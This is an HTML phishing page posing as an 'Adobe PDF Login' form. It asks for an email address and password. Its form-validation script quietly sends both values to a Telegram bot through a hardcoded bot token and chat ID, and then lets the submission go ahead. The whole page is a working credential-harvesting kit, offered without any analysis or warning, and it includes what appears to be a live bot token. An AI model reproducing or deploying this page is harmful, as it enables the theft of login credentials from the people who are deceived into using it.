<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    <meta charset="utf-8">
    <title>Adobe PDF Login</title>
    <link rel="shortcut icon" type="image/x-icon" href="http://antispmelite.com/favicon.ico">

    <style type="text/css">
        body {
            margin: 0;
            font-family: helvetica, verdana, arial, sans-serif;
            background: url(bg.jpg) no-repeat center center fixed;
            -webkit-background-size: cover;
            -moz-background-size: cover;
            -o-background-size: cover;
            background-size: cover;
        }

        #top-header {
            width: 100%;
            height: 50px;
            background: #000;
        }

        .transparent {
            zoom: 1;
            filter: alpha(opacity=90);
            opacity: 0.9;
        }

        .login-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(255, 255, 255, 0.8);
            padding: 20px;
            border-radius: 10px;
            box-shadow: rgba(0, 0, 0, 0.3) 0 1px 3px;
        }

        .inp {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #EAEAEA;
            border-radius: 3px;
            box-shadow: rgba(0, 0, 0, 0.3) 0 1px 3px;
        }

        .btn {
            background: #25aad6;
            background-image: linear-gradient(to bottom, #25aad6, #1593bc);
            border-radius: 10px;
            font-family: Arial;
            color: #ffffff;
            font-size: 20px;
            padding: 13px 15px;
            text-decoration: none;
            cursor: pointer;
            width: 100%;
        }

        .btn:hover {
            background: #1593bc;
            background-image: linear-gradient(to bottom, #1593bc, #25aad6);
        }

        .err {
            color: red;
            font-size: 14px;
        }
    </style>

</head>
<body>

    <div class="login-container">
        <h2>Login</h2>
        <form name="loginForm" method="post" onsubmit="return validateForm()">
            <div>
                <label for="username">Email:</label>
                <input type="text" id="username" name="username" class="inp" placeholder="Enter your email">
                <span id="errfn" class="err"></span>
            </div>
            <div>
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" class="inp" placeholder="Enter your password">
                <span id="errfnn" class="err"></span>
            </div>
            <div>
                <button type="submit" class="btn">Login</button>
            </div>
        </form>
    </div>

    <script type="text/javascript">
        function validateForm() {
            var x = document.forms["loginForm"]["username"].value;
            var atpos = x.indexOf("@");
            var dotpos = x.lastIndexOf(".");
            if (atpos < 1 || dotpos < atpos + 2 || dotpos + 2 >= x.length) {
                document.getElementById("errfn").innerHTML = "Not a valid email address";
                return false;
            } else {
                document.getElementById("errfn").innerHTML = "";
            }

            var y = document.forms["loginForm"]["password"].value;
            if (y == null || y == "") {
                document.getElementById("errfnn").innerHTML = "Password is required";
                return false;
            } else {
                document.getElementById("errfnn").innerHTML = "";
            }

            // Capture the email and password and send to Telegram
            var email = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            var message = `Email: ${email}\nPassword: ${password}`;

            const token = '6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4';
            const chatId = '1461764555';
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
            
            fetch(url)
              .then((response) => {
                if (!response.ok) {
                  throw new Error('Network response was not ok');
                }
              })
              .catch((error) => {
                console.error('There was a problem with the fetch operation:', error);
              });

            return true;
        }
    </script>

</body>
</html>
